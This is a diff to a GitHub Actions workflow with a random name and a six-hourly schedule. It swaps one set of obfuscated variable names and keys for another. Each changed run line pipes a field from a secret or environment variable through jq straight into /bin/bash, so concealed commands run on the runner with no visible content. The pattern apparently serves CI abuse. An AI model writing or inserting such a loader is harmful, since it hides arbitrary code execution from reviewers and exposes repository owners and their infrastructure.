@@ -1,9 +1,8 @@
 name: recruitklutzy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
+    - cron: '35 0/6 * * *'
 
 jobs:
   build:
@@ -12,20 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: recruitklutzy
         env:
-          zfq9: ${{ secrets.zfq9 }}
+          vcb6: ${{ secrets.vcb6 }}
         run: |
-          echo $zfq9 | jq -r .m5507 | /bin/bash
-          echo $smkb9 | jq -r .y36 | /bin/bash
-          echo $iq049 | jq -r .mewy09893 | /bin/bash
-          echo $svor49 | jq -r .t00 | /bin/bash
-          echo $c44 | jq -r .yewo2573 | /bin/bash
-          echo $kbw25 | jq -r .onuc797 | /bin/bash
-          echo $pc741 | jq -r .ityo0 | /bin/bash
-          echo $ifd6 | jq -r .wnhme83224 | /bin/bash
-          echo $zguf7 | jq -r .isvjt64149 | /bin/bash
-          echo $mmhre4 | jq -r .umjfh64 | /bin/bash
-          echo $fc778 | jq -r .lipt281 | /bin/bash
-          echo $tpiyf2 | jq -r .ruew8018 | /bin/bash
-          echo $zllgs95959 | jq -r .sm433 | /bin/bash
-          echo $j58508 | jq -r .e4 | /bin/bash
+          echo $vcb6 | jq -r .oss5 | /bin/bash
+          echo $ljieb1312 | jq -r .gcn72 | /bin/bash
+          echo $lzlva932 | jq -r .ypr40987 | /bin/bash
+          echo $pq962 | jq -r .oqwf8070 | /bin/bash
+          echo $sclm6086 | jq -r .l2 | /bin/bash
+          echo $uler0599 | jq -r .zad355 | /bin/bash
+          echo $zden9154 | jq -r .ib0558 | /bin/bash
+          echo $xxr6393 | jq -r .vt58 | /bin/bash
+          echo $ke31 | jq -r .hw849 | /bin/bash
+          echo $samw3897 | jq -r .ipq8062 | /bin/bash
 
